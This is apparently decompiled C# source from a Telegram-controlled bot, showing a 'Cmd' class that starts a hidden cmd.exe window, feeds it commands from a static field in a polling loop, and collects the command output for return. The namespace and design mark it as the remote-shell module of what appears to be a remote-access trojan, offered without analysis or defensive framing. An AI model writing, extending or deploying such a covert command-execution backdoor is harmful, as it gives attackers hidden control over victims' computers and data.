using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Threading;

namespace TelegramBot.Shell
{
	// Token: 0x020000F7 RID: 247
	internal class Cmd
	{
		// Token: 0x0600034E RID: 846 RVA: 0x000266E4 File Offset: 0x000248E4
		public static void UseShell()
		{
			StringBuilder stringBuilder = new StringBuilder();
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardError = true;
			process.OutputDataReceived += Cmd.CmdOutputDataHandler;
			process.Start();
			process.BeginOutputReadLine();
			while (Cmd.perm)
			{
				Thread.Sleep(Cmd.timeout);
				if (!string.IsNullOrEmpty(Cmd.cmd))
				{
					stringBuilder.Append(Cmd.cmd);
					stringBuilder.Append("\n");
					process.StandardInput.WriteLine(stringBuilder);
					stringBuilder.Remove(0, stringBuilder.Length);
					Cmd.cmd = null;
				}
			}
		}

		// Token: 0x0600034F RID: 847 RVA: 0x000267C0 File Offset: 0x000249C0
		public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder stringBuilder = new StringBuilder();
			if (!string.IsNullOrEmpty(outLine.Data))
			{
				stringBuilder.Append(outLine.Data);
				stringBuilder.Append("\n\n");
				byte[] bytes = Encoding.Default.GetBytes(stringBuilder.ToString());
				byte[] bytes2 = Encoding.Convert(Encoding.GetEncoding(866), Encoding.GetEncoding(866), bytes);
				string @string = Encoding.GetEncoding(866).GetString(bytes2);
				Cmd.output.Add(@string);
			}
		}

		// Token: 0x04000570 RID: 1392
		public static string cmd;

		// Token: 0x04000571 RID: 1393
		public static bool perm;

		// Token: 0x04000572 RID: 1394
		public static int timeout = 7000;

		// Token: 0x04000573 RID: 1395
		public static List<string> output = new List<string>();
	}
}
